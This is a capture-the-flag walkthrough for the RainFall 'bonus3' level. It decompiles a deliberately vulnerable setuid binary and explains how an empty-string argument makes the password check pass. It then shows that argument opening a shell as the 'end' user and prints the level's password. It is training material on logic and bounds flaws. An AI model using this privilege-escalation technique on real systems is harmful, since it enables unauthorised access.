# Bonus3 Walkthrough

## Who am I?

```bash
bonus3@RainFall:~$ id
uid=2013(bonus3) gid=2013(bonus3) groups=2013(bonus3),100(users)
```

## Where am I?

```bash
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
# note: the `s` bits indicate setuid/setgid, the binary runs with the owner's privileges (here `end`) when executed by another user (here `bonus3`).
```

---

## Discovery, behavior test

```bash
bonus3@RainFall:~$ ./bonus3 
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$
```

**Observation**: The program requires one argument but produces no visible output in normal execution.

---

## Function analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    char buffer1[66];
    char buffer2[66];
    FILE *file;
    int index;
    
    file = fopen("/home/user/end/.pass", "r");
    
    memset(buffer1, 0, 66);
    
    if (file == NULL || argc != 2) {
        return -1;
    }
    
    fread(buffer1, 1, 66, file);
    buffer1[65] = '\0';
    
    index = atoi(argv[1]);
    buffer1[index] = '\0';
    
    fread(buffer2, 1, 65, file);
    
    fclose(file);
    
    if (strcmp(buffer1, argv[1]) == 0) {
        execl("/bin/sh", "sh", NULL);
    }
    else {
        puts(buffer2);
    }
    
    return 0;
}
```

### Vulnerability Analysis

* **File reading**:
  * Opens `/home/user/end/.pass` and reads its contents into `buffer1` (66 bytes) and `buffer2` (65 bytes)
  * We don't have read permissions on this file, but the binary runs with `end` privileges

* **Arbitrary null byte write**:
  * `index = atoi(argv[1])`: Converts the argument to an integer
  * `buffer1[index] = '\0'`: **CRITICAL** - Writes a null byte at the specified index without any bounds checking
  * This allows us to truncate `buffer1` at any position

* **Logic flaw**:
  * `strcmp(buffer1, argv[1]) == 0`: Checks if `buffer1` equals `argv[1]` as strings
  * For this to be true, both strings must be identical
  * **Key insight**: If we pass an empty string `""`, then `atoi("")` returns `0`, which sets `buffer1[0] = '\0'`
  * This makes `buffer1` an empty string, and `strcmp("", "") == 0` succeeds!

### Exploitation Strategy

The exploit is simple:
1. Pass an empty string `""` as argument
2. `atoi("")` returns `0`
3. `buffer1[0] = '\0'` makes `buffer1` an empty string
4. `strcmp("", "") == 0` evaluates to true
5. `execl("/bin/sh", "sh", NULL)` spawns a shell with `end` privileges

---

## Execute the exploit

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C source)

---

## Conclusion

This binary contains a logic flaw where the programmer assumed that `buffer1` would contain meaningful data when compared to `argv[1]`. However, by exploiting the arbitrary null byte write vulnerability with `atoi("")` returning `0`, we can make both strings empty and bypass the comparison check. This grants us a shell with `end` user privileges, completing the Rainfall project.
